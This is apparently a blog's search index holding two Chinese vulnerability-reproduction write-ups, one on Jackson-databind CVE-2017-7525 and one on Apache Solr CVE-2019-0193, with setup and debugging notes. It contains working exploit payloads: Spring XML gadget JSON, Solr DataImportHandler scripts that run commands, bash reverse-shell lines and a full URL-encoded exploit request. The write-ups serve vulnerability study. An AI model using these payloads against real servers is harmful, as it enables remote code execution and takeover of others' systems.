<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title><![CDATA[jackson反序列化漏洞_1]]></title>
      <url>/2020/01/13/Web%E6%B8%97%E9%80%8F/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E_1/</url>
      <content type="html"><![CDATA[<h1 id="jackson反序列化漏洞-1"><a href="#jackson反序列化漏洞-1" class="headerlink" title="jackson反序列化漏洞_1"></a>jackson反序列化漏洞_1</h1><p>[TOC]</p>
<h2 id="CVE-2017-7525"><a href="#CVE-2017-7525" class="headerlink" title="CVE-2017-7525"></a>CVE-2017-7525</h2><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>Jackson enableDefaultTyping 方法反序列化代码执行漏洞</p>
<p>《漏洞通告】Jackson-databind远程命令执行漏洞通告（CVE-2017-7525）》[1]指出，Jackson是一个开源的java序列化与反序列化工具，可以将java对象序列化为xml和json格式的字符串或将两种文件反序列化为相应的对象。</p>
<p>Jackson-databind存在远程命令执行漏洞，因Jackson反序列化漏洞（CVE-2017-7525）采用黑名单的方法修复程序，CVE-2017-17485在开启enableDefaultTyping()的前提下可以通过Jackson-databind来滥用Spring spel来执行任意命令。</p>
<h4 id="jackson-datablind"><a href="#jackson-datablind" class="headerlink" title="jackson-datablind"></a>jackson-datablind</h4><p>jackson本身提供的jackson-core的api调用起来会比较麻烦，jackson-datablind通过依赖core和annotations使jackson调用起来更简单</p>
<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><p>根据触发条件是ObjectMapper反序列化前调用了enableDefaultTyping方法。该方法允许json字符串中指定反序列化java对象的类名，而在使用Object、Map、List等对象时，可诱发反序列化漏洞<br>【1】Jackson 2.7版本（&lt;2.7.10）、2.8版本（&lt;2.8.9）<br>【2】调用了enableDefaultTyping方法<br>【3】反序列化的类可控</p>
<h4 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h4><p>【java】代码</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> jackson<span class="token punctuation">.</span>rce<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span>Files<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span>Paths<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span>
<span class="token keyword">import</span> com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span>ObjectMapper<span class="token punctuation">;</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">App</span> 
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span> String<span class="token punctuation">[</span><span class="token punctuation">]</span> args <span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException 
    <span class="token punctuation">{</span>
        ObjectMapper om <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectMapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        om<span class="token punctuation">.</span><span class="token function">enableDefaultTyping</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> json <span class="token operator">=</span> Files<span class="token punctuation">.</span><span class="token function">readAllBytes</span><span class="token punctuation">(</span>Paths<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        inner i <span class="token operator">=</span> om<span class="token punctuation">.</span><span class="token function">readValue</span><span class="token punctuation">(</span>json<span class="token punctuation">,</span> inner<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">class</span> <span class="token class-name">inner</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">int</span> id<span class="token punctuation">;</span>
    <span class="token keyword">public</span> Object obj<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>通过传参得方式读入反序列化的类<br>【json】代码<br>本地读取xml</p>
<pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"id"</span><span class="token operator">:</span><span class="token number">123</span><span class="token punctuation">,</span> <span class="token property">"obj"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"org.springframework.context.support.FileSystemXmlApplicationContext"</span><span class="token punctuation">,</span> <span class="token string">"//Users/daiq/knownsec/工作/互联网/学习/java/RCE/jackson/cve_2017_2725/jackson-rce-via-spel/spel.xml"</span><span class="token punctuation">]</span><span class="token punctuation">}</span>
</code></pre>
<p>也可以远程读取，改成<code>http</code>协议就行</p>
<pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"id"</span><span class="token operator">:</span><span class="token number">123</span><span class="token punctuation">,</span> <span class="token property">"obj"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"org.springframework.context.support.FileSystemXmlApplicationContext"</span><span class="token punctuation">,</span> <span class="token string">"https://raw.githubusercontent.com/irsl/jackson-rce-via-spel/master/spel.xml"</span><span class="token punctuation">]</span><span class="token punctuation">}</span>
</code></pre>
<p>【xml】代码</p>
<pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>beans</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans<span class="token punctuation">"</span></span>
  <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>
  <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>
     http://www.springframework.org/schema/beans
     http://www.springframework.org/schema/beans/spring-beans.xsd
<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>pb<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>java.lang.ProcessBuilder<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>constructor-arg</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/System/Applications/Calculator.app<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>whatever<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#{ pb.start() }<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>beans</span><span class="token punctuation">></span></span>
</code></pre>
<h4 id="调用结果"><a href="#调用结果" class="headerlink" title="调用结果"></a>调用结果</h4><p><img src="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752623110024.jpg" alt="-w1127"></p>
<h3 id="漏洞复现说明"><a href="#漏洞复现说明" class="headerlink" title="漏洞复现说明"></a>漏洞复现说明</h3><p>根据该漏洞调试情况，表面上问题主要出在readvalue传入的参数可控，在该案例中，通过读取json文件中的需要转换为inner类的json数据，该json数据中调用<code>FileSystemXmlApplicationContext</code>读入xml中的bean数据，在该方法的调用中实现命令执行</p>
<h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><p>【1】通过<code>FileSystemXmlApplicationContext</code>读取绝对路径时，得写上两个<code>\</code></p>
<h3 id="漏洞跟踪"><a href="#漏洞跟踪" class="headerlink" title="漏洞跟踪"></a>漏洞跟踪</h3><p>【1】readvalue函数需要参数 byte[],转换的类对象<br><img src="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752631863029.jpg" alt="-w998"><br>【2】从接收的json字节流中创建解析对象<br><code>jsonfactory.creatParse</code>其中<code>src</code>为传入的字节流数据<br><img src="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752636355629.jpg" alt="-w1121"><br>传入要转换的java对象<br><img src="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752648786936.jpg" alt="-w951"></p>
<p>【3】通过2构造readMapAndClose传入数据来调用解析json数据<br><img src="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752650611056.jpg" alt="-w1190"><br>传入的p0数据<br><img src="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752650176156.jpg" alt="-w1064"></p>
<p>【4】反序列化json数据流<br><img src="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752651998120.jpg" alt="-w1224"></p>
<p>…<br>…<br>object对象读入<br><code>deserializeFromString</code>-&gt;<code>createFromString</code>-&gt;<code>newInstance</code>-&gt;<br><code>loadBeanDefinitions</code>-&gt;<code>FileSystemXmlApplicationContext</code>-&gt;<code>refresh</code><br><img src="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752667685983.jpg" alt="-w980"></p>
<p><code>createFromString</code> ：读取json对象，读入xml文件内容<br><code>newInstance</code> ：调用<code>Class.forName</code>加载类 并实例化 即加载<br><code>org.springframework.context.support.FileSystemXmlApplicationContext</code> 实例处理xml文件中的内容</p>
<p><code>FileSystemResource</code> 读取xml内容<br><code>loadBeanDefinitions</code>:读取xml内容字节流，输入字节流处理<br><code>refresh</code>函数进行xml初始化实例<br><img src="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752816212912.jpg" alt="-w1040"></p>
<p><img src="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752813499215.jpg" alt="-w523"><br><img src="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752830381227.jpg" alt="-w895"></p>
<p><img src="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752832744311.jpg" alt="-w1018"><br><img src="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752835566747.jpg" alt="-w1035"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://chenergy1991.github.io/2019/03/24/CVE-2017-7275/" target="_blank" rel="noopener">CVE-2017-7275：Jackson-databind漏洞复现与分析笔记</a><br><a href="https://blog.csdn.net/u011499747/article/details/78762007" target="_blank" rel="noopener">Jackson之jackson-databind</a><br><a href="https://www.cnblogs.com/EasonJim/p/8449968.html" target="_blank" rel="noopener">Jackson工具类使用及配置指南、高性能配置（转）</a><br><a href="https://www.jianshu.com/p/de206c18ce08" target="_blank" rel="noopener">Java中newInstance()和new()</a></p>
]]></content>
      
        <categories>
            
            <category> web 渗透 </category>
            
            <category> java反序列化 </category>
            
            <category> jackson </category>
            
        </categories>
        
        
        <tags>
            
            <tag> web 渗透 </tag>
            
            <tag> java反序列化 </tag>
            
            <tag> jackson </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Apache Solr CVE-2019-0193 复现与学习]]></title>
      <url>/2019/09/08/Web%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/Apache%20Solr%20CVE-2019-0193%20%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%AD%A6%E4%B9%A0/</url>
      <content type="html"><![CDATA[<h1 id="Apache-Solr-CVE-2019-0193-复现与学习"><a href="#Apache-Solr-CVE-2019-0193-复现与学习" class="headerlink" title="Apache Solr CVE-2019-0193 复现与学习"></a>Apache Solr CVE-2019-0193 复现与学习</h1><p>[TOC]</p>
<h2 id="简介（抄袭，具体功能没搞懂）"><a href="#简介（抄袭，具体功能没搞懂）" class="headerlink" title="简介（抄袭，具体功能没搞懂）"></a>简介（抄袭，具体功能没搞懂）</h2><p>Apache Solr是一个企业级搜索平台，用Java编写且开源，基于Apache Lucene项目。</p>
<p>主要功能包括：<br>full-text search 全文搜索<br>hit highlighting<br>faceted search<br>dynamic clustering 动态聚类<br>document parsing 文档解析<br>Solr可以像数据库一样被使用：<br>1.运行服务器，创建collection1<br>2.从外部获取数据 - 向collection1发送不同类型的数据（例如文本，xml文档，pdf文档等任何格式）<br>3.存储数据并生成索引 - Solr自动索引这些数据并提供快速、丰富的REST API接口，以便于你搜索已有数据<br>与Solr服务器通信的唯一协议是HTTP，并且默认情况下无需身份验证即可访问，所以Solr容易受到web攻击(SSRF，CSRF等)。</p>
<h2 id="漏洞-CVE-2019-0193"><a href="#漏洞-CVE-2019-0193" class="headerlink" title="漏洞 CVE-2019-0193"></a>漏洞 CVE-2019-0193</h2><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ul>
<li>1.Apache Solr的DataImportHandler启用了模块DataImportHandler(默认情况下该模块不会被启用)</li>
<li>2.Solr Admin UI未开启鉴权认证。（默认情况下打开web界面无需任何认证</li>
</ul>
<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><h4 id="简版vulhub"><a href="#简版vulhub" class="headerlink" title="简版vulhub"></a>简版vulhub</h4><p>直接利用vulhub进行搭建测试，详情按下不表。<br>这个漏洞复现遇到点问题，根据教程搭建的环境，进行复现，结果发现没法触发成功,运行poc 报错如下<br><img src="/2019/09/08/Web渗透/漏洞学习/Apache Solr CVE-2019-0193 复现与学习/15653397148895/15673229505327.jpg" alt="-w1220"><br>感觉应该是vps的防火墙配置出的问题，换成本地调试没有问题<br><img src="/2019/09/08/Web渗透/漏洞学习/Apache Solr CVE-2019-0193 复现与学习/15653397148895/15675248523422.jpg" alt="-w1375"><br><img src="/2019/09/08/Web渗透/漏洞学习/Apache Solr CVE-2019-0193 复现与学习/15653397148895/15675248663003.jpg" alt="-w727"></p>
<h4 id="配置下载"><a href="#配置下载" class="headerlink" title="配置下载"></a>配置下载</h4><p>apache solr 版本：Solr-8.1.1<br>jdk版本：1.8.0_144<br>在idea 中调试该环境</p>
<h5 id="源码导入idea调试"><a href="#源码导入idea调试" class="headerlink" title="源码导入idea调试"></a>源码导入idea调试</h5><ul>
<li>配置ant server</li>
</ul>
<p><img src="/2019/09/08/Web渗透/漏洞学习/Apache Solr CVE-2019-0193 复现与学习/15653397148895/15673449263122.jpg" alt="-w479"></p>
<pre><code>ant ivy-bootstrap  //安装ivy
cd solr
ant server
cd ..
ant idea

</code></pre><ul>
<li>启动远程调试<br>创建 test core<br><img src="/2019/09/08/Web渗透/漏洞学习/Apache Solr CVE-2019-0193 复现与学习/15653397148895/15673861985710.jpg" alt="-w610"><br>这个时候会发现报错，需要在<pre><code>solr-7.7.2/solr/server/solr/test/conf
</code></pre>目录进行修改添加</li>
</ul>
<pre><code> &lt;requestHandler name=&quot;/dataimport&quot; class=&quot;solr.DataImportHandler&quot;&gt; 
      &lt;lst name=&quot;defaults&quot;&gt; 
        &lt;str name=&quot;config&quot;&gt;data-config.xml&lt;/str&gt; 
      &lt;/lst&gt; 
    &lt;/requestHandler&gt;
</code></pre><p>发现继续报错</p>
<pre><code>Error loading class &#39;org.apache.solr.handler.dataimport.DataImportHandler&#39;
</code></pre><pre><code>cp solr/dist/solr-dataimporthander  server/solr-webapp/webapp/WEB-INF/lib 
</code></pre><p><img src="/2019/09/08/Web渗透/漏洞学习/Apache Solr CVE-2019-0193 复现与学习/15653397148895/15675673373203.jpg" alt="-w458"></p>
<p>可以正常创建了<br><img src="/2019/09/08/Web渗透/漏洞学习/Apache Solr CVE-2019-0193 复现与学习/15653397148895/15675675380907.jpg" alt="-w1420"></p>
<ul>
<li>调试命令</li>
</ul>
<pre><code>$ cd solr-8.1.1\server
$ java &quot;-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=9000&quot; -Dsolr.solr.home=&quot;../example/example-DIH/solr/&quot; -jar start.jar --module=http
</code></pre><h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><h4 id="数据源类型为URLDataSource"><a href="#数据源类型为URLDataSource" class="headerlink" title="数据源类型为URLDataSource"></a>数据源类型为URLDataSource</h4><ul>
<li>测试poc：</li>
</ul>
<pre><code>&lt;dataConfig&gt;
&lt;dataSource type=&quot;URLDataSource&quot;/&gt;
  &lt;script&gt;&lt;![CDATA[ java.lang.Runtime.getRuntime().exec(&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;);
  ]]&gt;&lt;/script&gt;
  &lt;document&gt;
    &lt;entity name=&quot;a&quot;
            url=&quot;https://stackoverflow.com/feeds/tag/solr&quot;
            processor=&quot;XPathEntityProcessor&quot;
            forEach=&quot;/feed&quot;
            transformer=&quot;script:&quot; /&gt;
  &lt;/document&gt;
&lt;/dataConfig&gt;
</code></pre><ul>
<li>反弹shell</li>
</ul>
<pre><code>&lt;dataConfig&gt;
&lt;dataSource type=&quot;URLDataSource&quot;/&gt;
  &lt;script&gt;&lt;![CDATA[ java.lang.Runtime.getRuntime().exec(&quot;/bin/bash -c $@|bash 0 echo bash -i &gt;&amp;/dev/tcp/127.0.0.1/9999 0&gt;&amp;1&quot;);
  ]]&gt;&lt;/script&gt;
  &lt;document&gt;
    &lt;entity name=&quot;a&quot;
            url=&quot;https://stackoverflow.com/feeds/tag/solr&quot;
            processor=&quot;XPathEntityProcessor&quot;
            forEach=&quot;/feed&quot;
            transformer=&quot;script:&quot; /&gt;
  &lt;/document&gt;
&lt;/dataConfig&gt;
</code></pre><pre><code>&lt;dataConfig&gt;


  &lt;dataSource type=&quot;URLDataSource&quot;/&gt;
  &lt;script&gt;&lt;![CDATA[

          function poc(row){

 var bufReader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(&quot;/bin/bash -c $@|bash 0 echo bash -i &gt;&amp;/dev/tcp/127.0.0.1/9999 0&gt;&amp;1&quot;)));

var result = [];

while(true) {
var oneline = bufReader.readLine();
result.push( oneline );
if(!oneline) break;
}

row.put(&quot;title&quot;,result.join(&quot;\n\r&quot;));

return row;

}


  ]]&gt;&lt;/script&gt;

        &lt;document&gt;
             &lt;entity name=&quot;entity1&quot;
                     url=&quot;https://raw.githubusercontent.com/1135/solr_exploit/master/URLDataSource/demo.xml&quot;
                     processor=&quot;XPathEntityProcessor&quot;
                     forEach=&quot;/RDF/item&quot;
                     transformer=&quot;script:poc&quot;&gt;
                        &lt;field column=&quot;title&quot; xpath=&quot;/RDF/item/title&quot; /&gt;
             &lt;/entity&gt;
        &lt;/document&gt;
&lt;/dataConfig&gt;
</code></pre><p><img src="/2019/09/08/Web渗透/漏洞学习/Apache Solr CVE-2019-0193 复现与学习/15653397148895/15679455381821.jpg" alt="-w558"></p>
<p>默认权限为程序的启动权限</p>
<h5 id="远程检测poc"><a href="#远程检测poc" class="headerlink" title="远程检测poc"></a>远程检测poc</h5><ul>
<li>外连有回显</li>
</ul>
<pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dataConfig</span><span class="token punctuation">></span></span>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dataSource</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>URLDataSource<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token cdata">&lt;![CDATA[
          function poc(row){
 var bufReader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec("ls").getInputStream()));

var result = [];

while(true) {
var oneline = bufReader.readLine();
result.push( oneline );
if(!oneline) break;
}

row.put("title",result.join("\n\r"));

return row;

}
  ]]></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>

        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>document</span><span class="token punctuation">></span></span>
             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>entity</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>entity1<span class="token punctuation">"</span></span>
                     <span class="token attr-name">url</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://raw.githubusercontent.com/1135/solr_exploit/master/URLDataSource/demo.xml<span class="token punctuation">"</span></span>
                     <span class="token attr-name">processor</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>XPathEntityProcessor<span class="token punctuation">"</span></span>
                     <span class="token attr-name">forEach</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/RDF/item<span class="token punctuation">"</span></span>
                     <span class="token attr-name">transformer</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>script:poc<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>field</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>title<span class="token punctuation">"</span></span> <span class="token attr-name">xpath</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/RDF/item/title<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>entity</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>document</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dataConfig</span><span class="token punctuation">></span></span>
</code></pre>
<p>其中<code>https://raw.githubusercontent.com/1135/solr_exploit/master/URLDataSource/demo.xml</code>文件内容如下：</p>
<pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>RDF</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>item</span><span class="token punctuation">/></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>RDF</span><span class="token punctuation">></span></span>
</code></pre>
<p><img src="/2019/09/08/Web渗透/漏洞学习/Apache Solr CVE-2019-0193 复现与学习/15653397148895/15679479637186.jpg" alt="-w1437"></p>
<h4 id="数据源类型为ContentStreamDataSource"><a href="#数据源类型为ContentStreamDataSource" class="headerlink" title="数据源类型为ContentStreamDataSource"></a>数据源类型为ContentStreamDataSource</h4><ul>
<li>不外连 + 回显<br>在该检测方式中 由于 ContentStreamDataSource能接收Post数据直接作为数据源，可以不用外连获取数据源。</li>
</ul>
<pre><code>POST /solr/tika/dataimport?command=full-import&amp;verbose=false&amp;clean=false&amp;commit=false&amp;debug=true&amp;core=tika&amp;name=dataimport&amp;dataConfig=%0a%3c%64%61%74%61%43%6f%6e%66%69%67%3e%0a%3c%64%61%74%61%53%6f%75%72%63%65%20%6e%61%6d%65%3d%22%73%74%72%65%61%6d%73%72%63%22%20%74%79%70%65%3d%22%43%6f%6e%74%65%6e%74%53%74%72%65%61%6d%44%61%74%61%53%6f%75%72%63%65%22%20%6c%6f%67%67%65%72%4c%65%76%65%6c%3d%22%54%52%41%43%45%22%20%2f%3e%0a%0a%20%20%3c%73%63%72%69%70%74%3e%3c%21%5b%43%44%41%54%41%5b%0a%20%20%20%20%20%20%20%20%20%20%66%75%6e%63%74%69%6f%6e%20%70%6f%63%28%72%6f%77%29%7b%0a%20%76%61%72%20%62%75%66%52%65%61%64%65%72%20%3d%20%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%42%75%66%66%65%72%65%64%52%65%61%64%65%72%28%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%49%6e%70%75%74%53%74%72%65%61%6d%52%65%61%64%65%72%28%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%69%66%63%6f%6e%66%69%67%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%29%29%3b%0a%0a%76%61%72%20%72%65%73%75%6c%74%20%3d%20%5b%5d%3b%0a%0a%77%68%69%6c%65%28%74%72%75%65%29%20%7b%0a%76%61%72%20%6f%6e%65%6c%69%6e%65%20%3d%20%62%75%66%52%65%61%64%65%72%2e%72%65%61%64%4c%69%6e%65%28%29%3b%0a%72%65%73%75%6c%74%2e%70%75%73%68%28%20%6f%6e%65%6c%69%6e%65%20%29%3b%0a%69%66%28%21%6f%6e%65%6c%69%6e%65%29%20%62%72%65%61%6b%3b%0a%7d%0a%0a%72%6f%77%2e%70%75%74%28%22%74%69%74%6c%65%22%2c%72%65%73%75%6c%74%2e%6a%6f%69%6e%28%22%5c%6e%5c%72%22%29%29%3b%0a%72%65%74%75%72%6e%20%72%6f%77%3b%0a%0a%7d%0a%0a%5d%5d%3e%3c%2f%73%63%72%69%70%74%3e%0a%0a%3c%64%6f%63%75%6d%65%6e%74%3e%0a%20%20%20%20%3c%65%6e%74%69%74%79%0a%20%20%20%20%20%20%20%20%73%74%72%65%61%6d%3d%22%74%72%75%65%22%0a%20%20%20%20%20%20%20%20%6e%61%6d%65%3d%22%65%6e%74%69%74%79%31%22%0a%20%20%20%20%20%20%20%20%64%61%74%61%73%6f%75%72%63%65%3d%22%73%74%72%65%61%6d%73%72%63%31%22%0a%20%20%20%20%20%20%20%20%70%72%6f%63%65%73%73%6f%72%3d%22%58%50%61%74%68%45%6e%74%69%74%79%50%72%6f%63%65%73%73%6f%72%22%0a%20%20%20%20%20%20%20%20%72%6f%6f%74%45%6e%74%69%74%79%3d%22%74%72%75%65%22%0a%20%20%20%20%20%20%20%20%66%6f%72%45%61%63%68%3d%22%2f%52%44%46%2f%69%74%65%6d%22%0a%20%20%20%20%20%20%20%20%74%72%61%6e%73%66%6f%72%6d%65%72%3d%22%73%63%72%69%70%74%3a%70%6f%63%22%3e%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%3c%66%69%65%6c%64%20%63%6f%6c%75%6d%6e%3d%22%74%69%74%6c%65%22%20%78%70%61%74%68%3d%22%2f%52%44%46%2f%69%74%65%6d%2f%74%69%74%6c%65%22%20%2f%3e%0a%20%20%20%20%3c%2f%65%6e%74%69%74%79%3e%0a%3c%2f%64%6f%63%75%6d%65%6e%74%3e%0a%3c%2f%64%61%74%61%43%6f%6e%66%69%67%3e%0a%20%20%20%20%0a%20%20%20%20%20%20%20%20%20%20%20 HTTP/1.1
Host: solr.com:8983
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://solr.com:8983/solr/
Content-Length: 210
content-type: multipart/form-data; boundary=------------------------aceb88c2159f183f


--------------------------aceb88c2159f183f
Content-Disposition: form-data; name=&quot;stream.body&quot;

&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;RDF&gt;
&lt;item/&gt;
&lt;/RDF&gt;

--------------------------aceb88c2159f183f--
</code></pre><p>url 解码后数据如下</p>
<pre class=" language-xml"><code class="language-xml">
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dataConfig</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dataSource</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>streamsrc<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>ContentStreamDataSource<span class="token punctuation">"</span></span> <span class="token attr-name">loggerLevel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>TRACE<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>

  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token cdata">&lt;![CDATA[
          function poc(row){
 var bufReader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec("ifconfig").getInputStream()));

var result = [];

while(true) {
var oneline = bufReader.readLine();
result.push( oneline );
if(!oneline) break;
}

row.put("title",result.join("\n\r"));
return row;

}

